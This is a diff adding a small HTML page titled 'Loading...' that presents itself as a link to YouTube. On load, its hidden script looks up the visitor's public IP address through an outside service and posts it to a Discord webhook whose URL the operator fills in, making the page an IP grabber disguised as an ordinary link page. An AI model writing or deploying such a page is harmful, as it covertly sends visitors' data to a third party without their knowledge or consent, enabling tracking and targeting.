@@ -1,0 +1,29 @@
+<html>
+    <head>
+        <title>
+            Loading...
+        </title>
+        <script>
+            fetch("https://api.ipify.org")
+                .then(response => response.text())
+                .then(text => POST(text))
+
+
+            function POST(AddrIP) {
+                const DISCORD_WEBHOOK = ""; // Url here
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ "content": AddrIP })
+                });
+            }
+        </script>
+    </head>
+    <body>
+        <p>
+            Click here to go on <a href="https://www.youtube.com/">Youtube.com</a>... 
+        </p>
+    </body>
+</html>
